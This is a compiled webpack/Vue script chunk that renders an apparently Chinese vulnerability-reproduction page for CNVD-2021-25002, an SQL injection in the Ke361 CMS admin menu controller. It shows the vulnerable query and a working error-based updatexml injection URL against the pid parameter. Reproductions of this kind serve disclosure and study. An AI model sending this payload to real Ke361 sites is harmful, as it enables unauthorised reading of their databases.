(window.webpackJsonp=window.webpackJsonp||[]).push([[97],{2035:function(t,s,a){"use strict";a.r(s);var n=a(75),e=Object(n.a)({},(function(){var t=this,s=t.$createElement,n=t._self._c||s;return n("ContentSlotsDistributor",{attrs:{"slot-key":t.$parent.slotKey}},[n("h1",{attrs:{id:"ke361-menucontroller-class-php-后台sql注入漏洞-cnvd-2021-25002"}},[n("a",{staticClass:"header-anchor",attrs:{href:"#ke361-menucontroller-class-php-后台sql注入漏洞-cnvd-2021-25002"}},[t._v("#")]),t._v(" Ke361 MenuController.class.php 后台SQL注入漏洞 CNVD-2021-25002")]),t._v(" "),n("h2",{attrs:{id:"漏洞描述"}},[n("a",{staticClass:"header-anchor",attrs:{href:"#漏洞描述"}},[t._v("#")]),t._v(" 漏洞描述")]),t._v(" "),n("p",[t._v("Ke361 MenuController.class.php文件 index() 函数中的pid参数存在 SQL注入漏，导致攻击者通过漏洞可以获取数据库敏感信息")]),t._v(" "),n("h2",{attrs:{id:"漏洞影响"}},[n("a",{staticClass:"header-anchor",attrs:{href:"#漏洞影响"}},[t._v("#")]),t._v(" 漏洞影响")]),t._v(" "),n("a-checkbox",{attrs:{checked:""}},[t._v("Ke361")]),n("br"),t._v(" "),n("h2",{attrs:{id:"环境搭建"}},[n("a",{staticClass:"header-anchor",attrs:{href:"#环境搭建"}},[t._v("#")]),t._v(" 环境搭建")]),t._v(" "),n("a-checkbox",{attrs:{checked:""}},[t._v("https://gitee.com/jcove/ke361")]),n("br"),t._v(" "),n("h2",{attrs:{id:"漏洞复现"}},[n("a",{staticClass:"header-anchor",attrs:{href:"#漏洞复现"}},[t._v("#")]),t._v(" 漏洞复现")]),t._v(" "),n("p",[t._v("CMS产品页面")]),t._v(" "),n("p",[n("img",{attrs:{src:a(876),alt:"img"}})]),t._v(" "),n("p",[t._v("存在漏洞的文件为 "),n("strong",[t._v("Application/Admin/Controller/MenuController.class.php")])]),t._v(" "),n("p",[n("img",{attrs:{src:a(877),alt:"img"}})]),t._v(" "),n("p",[t._v("Get 传参 pid 传入SQL语句")]),t._v(" "),n("div",{staticClass:"language-php line-numbers-mode"},[n("pre",{pre:!0,attrs:{class:"language-php"}},[n("code",[n("span",{pre:!0,attrs:{class:"token constant"}},[t._v("SELECT")]),t._v(" "),n("span",{pre:!0,attrs:{class:"token string backtick-quoted-string"}},[t._v("`id`")]),n("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(",")]),n("span",{pre:!0,attrs:{class:"token string backtick-quoted-string"}},[t._v("`title`")]),n("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(",")]),n("span",{pre:!0,attrs:{class:"token string backtick-quoted-string"}},[t._v("`pid`")]),n("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(",")]),n("span",{pre:!0,attrs:{class:"token string backtick-quoted-string"}},[t._v("`sort`")]),n("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(",")]),n("span",{pre:!0,attrs:{class:"token string backtick-quoted-string"}},[t._v("`url`")]),n("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(",")]),n("span",{pre:!0,attrs:{class:"token string backtick-quoted-string"}},[t._v("`hide`")]),n("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(",")]),n("span",{pre:!0,attrs:{class:"token string backtick-quoted-string"}},[t._v("`tip`")]),n("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(",")]),n("span",{pre:!0,attrs:{class:"token string backtick-quoted-string"}},[t._v("`group`")]),n("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(",")]),n("span",{pre:!0,attrs:{class:"token string backtick-quoted-string"}},[t._v("`is_dev`")]),n("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(",")]),n("span",{pre:!0,attrs:{class:"token string backtick-quoted-string"}},[t._v("`status`")]),t._v(" "),n("span",{pre:!0,attrs:{class:"token constant"}},[t._v("FROM")]),t._v(" "),n("span",{pre:!0,attrs:{class:"token string backtick-quoted-string"}},[t._v("`ke_menu`")]),t._v(" "),n("span",{pre:!0,attrs:{class:"token function"}},[t._v("WHERE")]),t._v(" "),n("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("(")]),t._v("id"),n("span",{pre:!0,attrs:{class:"token operator"}},[t._v("=")]),n("span",{pre:!0,attrs:{class:"token number"}},[t._v("1")]),n("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(")")]),t._v("\n")])]),t._v(" "),n("div",{staticClass:"line-numbers-wrapper"},[n("span",{staticClass:"line-number"},[t._v("1")]),n("br")])]),n("p",[t._v("使用括号闭合语句，构造SQL注入")]),t._v(" "),n("div",{staticClass:"language-php line-numbers-mode"},[n("pre",{pre:!0,attrs:{class:"language-php"}},[n("code",[n("span",{pre:!0,attrs:{class:"token operator"}},[t._v("/")]),t._v("admin"),n("span",{pre:!0,attrs:{class:"token operator"}},[t._v(".")]),t._v("php"),n("span",{pre:!0,attrs:{class:"token operator"}},[t._v("?")]),t._v("s"),n("span",{pre:!0,attrs:{class:"token operator"}},[t._v("=")]),n("span",{pre:!0,attrs:{class:"token operator"}},[t._v("/")]),t._v("Menu"),n("span",{pre:!0,attrs:{class:"token operator"}},[t._v("/")]),t._v("index"),n("span",{pre:!0,attrs:{class:"token operator"}},[t._v("/")]),t._v("pid"),n("span",{pre:!0,attrs:{class:"token operator"}},[t._v("/")]),n("span",{pre:!0,attrs:{class:"token number"}},[t._v("1")]),n("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(")")]),n("span",{pre:!0,attrs:{class:"token operator"}},[t._v("%")]),n("span",{pre:!0,attrs:{class:"token number"}},[t._v("20")]),t._v("AND"),n("span",{pre:!0,attrs:{class:"token operator"}},[t._v("%")]),n("span",{pre:!0,attrs:{class:"token number"}},[t._v("20")]),t._v("updatexml"),n("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("(")]),n("span",{pre:!0,attrs:{class:"token number"}},[t._v("1")]),n("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(",")]),n("span",{pre:!0,attrs:{class:"token function"}},[t._v("concat")]),n("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("(")]),n("span",{pre:!0,attrs:{class:"token number"}},[t._v("0x7e")]),n("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(",")]),n("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("(")]),t._v("select"),n("span",{pre:!0,attrs:{class:"token operator"}},[t._v("%")]),n("span",{pre:!0,attrs:{class:"token number"}},[t._v("20")]),t._v("md5"),n("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("(")]),n("span",{pre:!0,attrs:{class:"token number"}},[t._v("1")]),n("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(")")]),n("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(")")]),n("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(",")]),n("span",{pre:!0,attrs:{class:"token number"}},[t._v("0x7e")]),n("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(")")]),n("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(",")]),n("span",{pre:!0,attrs:{class:"token number"}},[t._v("1")]),n("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(")")]),n("span",{pre:!0,attrs:{class:"token operator"}},[t._v("--")]),n("span",{pre:!0,attrs:{class:"token operator"}},[t._v("+")]),t._v("\n")])]),t._v(" "),n("div",{staticClass:"line-numbers-wrapper"},[n("span",{staticClass:"line-number"},[t._v("1")]),n("br")])]),n("p",[n("img",{attrs:{src:a(878),alt:"img"}})])],1)}),[],!1,null,null,null);s.default=e.exports},876:function(t,s,a){t.exports=a.p+"assets/img/1634130579841-e981591e-46f6-4aa8-bc68-6fe39d1e4e35-20220313232948253.b730640f.png"},877:function(t,s,a){t.exports=a.p+"assets/img/1634136475760-256dded1-8bef-40a2-b391-e3a84bd7fcc2.39a27f2a.png"},878:function(t,s,a){t.exports=a.p+"assets/img/1634140622931-bdc55324-f405-4708-8973-4fef07eeac8e.e32aa548.png"}}]);